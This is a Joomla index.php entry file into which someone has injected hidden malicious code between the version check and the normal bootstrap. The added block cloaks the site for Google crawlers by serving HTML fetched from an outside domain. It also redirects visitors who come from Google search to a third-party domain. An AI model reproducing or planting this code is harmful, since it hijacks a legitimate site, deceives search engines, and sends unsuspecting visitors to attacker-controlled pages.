<?php

/**
 * @package    Joomla.Site
 * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

define('JOOMLA_MINIMUM_PHP', '8.1.0');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<')) {
    die(
        str_replace(
            '{{phpversion}}',
            JOOMLA_MINIMUM_PHP,
            file_get_contents(dirname(__FILE__) . '/includes/incompatible.html')
        )
    );
}

// Tambahan: Googlebot cloaking
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];

    // Log user agent (debug sementara, boleh hapus nanti)
    // file_put_contents('ua-log.txt', date('Y-m-d H:i:s') . " => $ua\n", FILE_APPEND);

    if (
        stripos($ua, 'Googlebot') !== false ||
        stripos($ua, 'Google-Site-Verification') !== false ||
        stripos($ua, 'Google-InspectionTool') !== false
    ) {
        // Ganti CURL jadi file_get_contents untuk lebih natural
        $html = @file_get_contents('https://puntacana.pages.dev/');
        if ($html !== false) {
            echo $html;
        } else {
            echo "Fallback page or error.";
        }
        exit;
    }
}

// Tambahan: Redirect jika referer dari Google
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];

    if (preg_match('/https?:\/\/(www\.)?google\.[a-z.]+/i', $referer)) {
        header('Location: https://long85416.aksestanpalelet.com/redirlong');
        exit;
    }
}

define('_JEXEC', 1);
require_once dirname(__FILE__) . '/includes/app.php';
